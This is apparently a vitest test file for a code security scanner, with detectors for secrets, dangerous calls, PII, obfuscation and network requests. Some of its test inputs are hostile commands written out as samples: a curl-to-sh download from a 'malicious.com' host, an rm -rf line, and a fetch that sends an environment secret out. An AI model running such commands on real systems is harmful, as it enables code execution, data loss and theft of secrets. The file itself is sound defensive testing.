import { describe, it, expect } from "vitest";
import { scanFileContent } from "../engine/scanner.js";
import { shannonEntropy } from "../detectors/secrets.js";
import { luhnCheck } from "../detectors/pii.js";
import { extractDomains } from "../detectors/network.js";

describe("Secrets Detector", () => {
  it("detects AWS keys", () => {
    const issues = scanFileContent('const key = "AKIAIOSFODNN7EXAMPLE";', "test.ts");
    const aws = issues.find((i) => i.id === "SEC001");
    expect(aws).toBeDefined();
    expect(aws!.severity).toBe("critical");
  });

  it("detects GitHub tokens", () => {
    const issues = scanFileContent(
      'const token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl";',
      "test.ts",
    );
    const gh = issues.find((i) => i.id === "SEC002");
    expect(gh).toBeDefined();
  });

  it("detects Stripe live keys", () => {
    const issues = scanFileContent(
      `const key = "${"sk" + "_live_" + "testkey123"}";`,
      "test.ts",
    );
    const stripe = issues.find((i) => i.id === "SEC003");
    expect(stripe).toBeDefined();
  });

  it("detects private keys", () => {
    const issues = scanFileContent(
      "-----BEGIN RSA PRIVATE KEY-----",
      "test.pem",
    );
    const pk = issues.find((i) => i.id === "SEC006");
    expect(pk).toBeDefined();
    expect(pk!.severity).toBe("critical");
  });

  it("detects hardcoded passwords", () => {
    const issues = scanFileContent('password = "mysecretpass123"', "config.ts");
    const pw = issues.find((i) => i.id === "SEC008");
    expect(pw).toBeDefined();
  });
});

describe("Shannon Entropy", () => {
  it("returns high entropy for random strings", () => {
    const e = shannonEntropy("aB3$kL9!mN2@pQ7&");
    expect(e).toBeGreaterThan(3.5);
  });

  it("returns low entropy for repetitive strings", () => {
    const e = shannonEntropy("aaaaaaaaaa");
    expect(e).toBe(0);
  });
});

describe("Dangerous Detector", () => {
  it("detects eval calls", () => {
    const issues = scanFileContent("eval(userInput)", "test.ts");
    const evalIssue = issues.find((i) => i.id === "DNG001");
    expect(evalIssue).toBeDefined();
  });

  it("detects curl | sh", () => {
    const issues = scanFileContent(
      "curl https://malicious.com/script.sh | sh",
      "install.sh",
    );
    const curl = issues.find((i) => i.id === "DNG005");
    expect(curl).toBeDefined();
    expect(curl!.severity).toBe("critical");
  });

  it("detects rm -rf /", () => {
    const issues = scanFileContent("rm -rf /tmp/data", "cleanup.sh");
    const rm = issues.find((i) => i.id === "DNG006");
    expect(rm).toBeDefined();
  });

  it("detects child_process", () => {
    const issues = scanFileContent(
      'const cp = require("child_process")',
      "test.ts",
    );
    const cp = issues.find((i) => i.id === "DNG003");
    expect(cp).toBeDefined();
  });

  it("detects env exfiltration", () => {
    const issues = scanFileContent(
      "fetch(process.env.SECRET_URL).then(send)",
      "test.ts",
    );
    // May match DNG008 for env exfiltration
    expect(issues.length).toBeGreaterThan(0);
  });
});

describe("PII Detector", () => {
  it("detects user home paths", () => {
    const issues = scanFileContent(
      'const path = "/Users/john/Documents"',
      "test.ts",
    );
    const pii = issues.find((i) => i.id === "PII001");
    expect(pii).toBeDefined();
  });

  it("detects real emails but not example emails", () => {
    const realIssues = scanFileContent("contact user@company.com", "readme.md");
    expect(realIssues.some((i) => i.id === "PII002")).toBe(true);

    const exampleIssues = scanFileContent(
      "contact user@example.com",
      "readme.md",
    );
    expect(exampleIssues.some((i) => i.id === "PII002")).toBe(false);
  });
});

describe("Luhn Check", () => {
  it("validates known Luhn-valid number", () => {
    expect(luhnCheck("4532015112830366")).toBe(true);
  });

  it("rejects invalid Luhn number", () => {
    expect(luhnCheck("1234567890123456")).toBe(false);
  });

  it("rejects too-short numbers", () => {
    expect(luhnCheck("123")).toBe(false);
  });
});

describe("Obfuscation Detector", () => {
  it("detects atob usage", () => {
    const issues = scanFileContent("const decoded = atob(encoded)", "test.ts");
    const obf = issues.find((i) => i.id === "OBF001");
    expect(obf).toBeDefined();
  });

  it("detects hex escape sequences", () => {
    const issues = scanFileContent(
      'const s = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21"',
      "test.ts",
    );
    const hex = issues.find((i) => i.id === "OBF003");
    expect(hex).toBeDefined();
  });
});

describe("Network Detector", () => {
  it("detects external fetch calls", () => {
    const issues = scanFileContent(
      'fetch("https://api.malicious.com/data")',
      "test.ts",
    );
    const net = issues.find((i) => i.id === "NET001");
    expect(net).toBeDefined();
  });

  it("ignores localhost fetch", () => {
    const issues = scanFileContent(
      'fetch("http://localhost:3000/api")',
      "test.ts",
    );
    const net = issues.find((i) => i.id === "NET001");
    expect(net).toBeUndefined();
  });
});

describe("extractDomains", () => {
  it("extracts unique domains from content", () => {
    const domains = extractDomains(
      'fetch("https://api.example.com/data"); fetch("https://api.example.com/other"); fetch("https://cdn.test.com/file")',
    );
    expect(domains).toContain("api.example.com");
    expect(domains).toContain("cdn.test.com");
    expect(domains).toHaveLength(2);
  });

  it("excludes localhost", () => {
    const domains = extractDomains('fetch("http://localhost:3000")');
    expect(domains).toHaveLength(0);
  });
});
